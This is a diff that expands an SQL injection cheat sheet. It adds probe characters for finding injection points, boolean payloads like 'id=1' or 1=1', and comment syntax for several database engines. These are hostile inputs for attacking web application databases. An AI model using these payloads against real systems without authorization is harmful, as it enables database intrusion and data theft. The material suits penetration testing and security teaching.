@@ -1,5 +1,54 @@
 # SQL Injection
 
+## Entry point detection
+```
+ [Nothing]
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+```
+
+## Entry point detection by Confirming with logical operations
+```
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
+```
+
+## Comments
+```
+MySQL
+#comment
+-- comment     [Note the space after the double dash]
+/*comment*/
+/*! MYSQL Special SQL */
+
+PostgreSQL
+--comment
+/*comment*/
+
+MSQL
+--comment
+/*comment*/
+
+Oracle
+--comment
+
+SQLite
+--comment
+/*comment*/
+
+HQL
+HQL does not support comments
+```
+
 ## All Kind of SQL Injection 
    - **Boolean-Based Blind**
    
